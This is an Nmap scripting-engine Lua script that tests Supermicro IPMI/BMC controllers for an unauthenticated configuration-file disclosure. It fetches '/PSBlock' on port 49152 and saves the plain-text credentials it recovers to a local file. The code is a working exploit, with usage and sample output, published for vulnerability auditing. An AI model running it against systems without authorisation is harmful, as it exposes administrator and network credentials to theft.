description = [[
Attempts to download an unprotected configuration file containing plain-text
user credentials in vulnerable Supermicro Onboard IPMI controllers.

The script connects to port 49152 and issues a request for "/PSBlock" to
download the file. This configuration file contains users with their passwords
in plain text.

References:
* http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/
* https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi
]]

---
-- @usage nmap -p49152 --script supermicro-ipmi-conf <target>
--
-- @output
-- PORT      STATE SERVICE REASON
-- 49152/tcp open  unknown syn-ack
-- | supermicro-ipmi-conf:
-- |   VULNERABLE:
-- |   Supermicro IPMI/BMC configuration file disclosure
-- |     State: VULNERABLE (Exploitable)
-- |     Description:
-- |       Some Supermicro IPMI/BMC controllers allow attackers to download
-- |        a configuration file containing plain text user credentials. This credentials may be used to log in to the administrative interface and the
-- |       network's Active Directory.
-- |     Disclosure date: 2014-06-19
-- |     Extra information:
-- |       Snippet from configuration file:
-- |   .............31spring.............\x14..............\x01\x01\x01.\x01......\x01ADMIN...........ThIsIsApAsSwOrD.............T.T............\x01\x01\x01.\x01......\x01ipmi............w00t!.............\x14.............
-- |   Configuration file saved to 'xxx.xxx.xxx.xxx_bmc.conf'
-- |
-- |     References:
-- |_      http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/
--
-- @args supermicro-ipmi-conf.out Output file to store configuration file. Default: <ip>_bmc.conf
---

author = "Paulino Calderon <calderon () websec mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local io = require "io"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"

portrule = shortport.portnumber(49152, "tcp")

---
--Writes string to file
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

action = function(host, port)
  local fw = stdnse.get_script_args(SCRIPT_NAME..".out") or host.ip.."_bmc.conf"
  local vuln = {
    title = 'Supermicro IPMI/BMC configuration file disclosure',
    state = vulns.STATE.NOT_VULN,
    description = [[
Some Supermicro IPMI/BMC controllers allow attackers to download
 a configuration file containing plain text user credentials. This credentials may be used to log in to the administrative interface and the
network's Active Directory.]],
    references = {
      'http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/',
    },
    dates = {
      disclosure = {year = '2014', month = '06', day = '19'},
    },
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local open_session = http.get(host, port, "/PSBlock")
  if open_session and open_session.status ==200 and string.len(open_session.body)>200 then
    local s = open_session.body:gsub("%z", ".")
    vuln.state = vulns.STATE.EXPLOIT
    local status, err = write_file(fw,s)
    local extra_info
    if status then
      extra_info = string.format("\nConfiguration file saved to '%s'\n", fw)
    else
      extra_info = ''
      stdnse.debug(1, "Error saving configuration file to '%s': %s\n", fw, err)
    end

    vuln.extra_info = "Snippet from configuration file:\n"..string.sub(s, 25, 200)..extra_info
  end
  return vuln_report:make_output(vuln)
end
